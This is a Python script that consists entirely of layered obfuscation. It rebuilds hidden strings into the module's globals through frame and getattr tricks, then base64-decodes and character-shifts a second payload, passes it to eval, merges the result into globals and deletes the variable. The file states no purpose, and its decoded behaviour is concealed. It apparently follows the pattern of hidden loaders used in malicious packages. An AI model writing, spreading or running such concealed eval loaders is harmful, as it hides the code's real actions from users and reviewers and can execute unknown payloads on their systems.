import sys
import binascii as ba
from functools import reduce
from itertools import tee
import base64

d = ['744468dc614b6b2453f54910560c4490h2acf36cc1ce90b3bfa9e2c301a9d9e2o7J4M7C6O6N486L2Q5HfI4X1X57064C9GhNo',
     '6b60611860e8661a7f207e417447786457f94a1d5f0c459556f364bd6b59779do6c6f601e6bec6c127f277b4872447b6d50f',
     '46c3f63ca6391685f61e57c4157fd6hb367587c9ao7c4c7b246f1b6fb0744457fd48165e0d4f93h02f97611c0a5fc80f461a',
     '482c72b668de381d74304104af28b4ce550336b724e6fb0609c7755204b0e7eb7fadc5o7e4d772c6f1f66bb704c56f876376',
     '8596f3170216c59714ah50723836d15cb031e35b10222ab2a9f8dd1c3c2282f73515dcb8d7404106d666f1bb5afe4aceb3fo',
     '6j6b65c46O9g7v356g5c7t245ffr6e1d7b0j64965Ofg6vby655t7g9h']

for g in reduce('e551f61c'.__class__.__add__, d).split('\157'):
    a = 'ab'
    b = f'f{chr(0o137)}'
    c = getattr(sys._getframe(0), f'{b}glo{a[::-1]}ls')
    h = 97
    e, f = (g[i::2].partition(chr(h ^ 0b1001))[0] for i in range(2))
    g = ''.join(map(chr, (b+(not f-int(str(h)[::-1])) for i, j in (tee(map(ord, e[:1]+f)),) if next(j, None) is not None for f, b in zip(i, j) if (b>>4)^4 or ~b&15)))
    c[getattr(c[a[::-1]], ''.join(c[0]+c[1] for c in zip(a, '2_'))+chr(h^0b1001)+'e'+chr(h^0o31))(e).decode()] = g

d = ['TFZFPjUzMDM2MkM2Q1ZpIFY2Snk5M3Y0On46eXgmS3hgfTp5aF02Snk5NSgiOn46eGR8czhIfT4qSHw+',
    'eGJ9czRjK3Z4ZHxzcT58JXhLKjsiYis+Kkl9OyJiKzp4RHg+',
    'ZDorOnhlfCU0X3xLJkp8SyJLfDpjSHwlOER4P31gKjp4ZXg7KmIrKHxIKyUqYyolJzkqJXRgfEsqSXx2Iz5+',
    'JXE6fnJ4RHg/fTszYnE9NEp4ZShKeTk0dj03ND4nOStyeTV7cnlhKyl5SzIoaEZ4O0BJNyJdNnR0eCRJOCdFYmFfYzs2eUs/XDVLP0BJcCt4d31AKjdCeUJmYzpiKjMhNFZO',
    ]

d = "".join(d) if isinstance(d, list) else d

d = base64.b64decode(d.encode()).decode()
d = ''.join([chr(33 + (ord(char) + 14) % 94) if 32 < ord(char) < 127 else char for char in d])
d = eval(d)
globals().update(d)

d = None
del globals()['d']
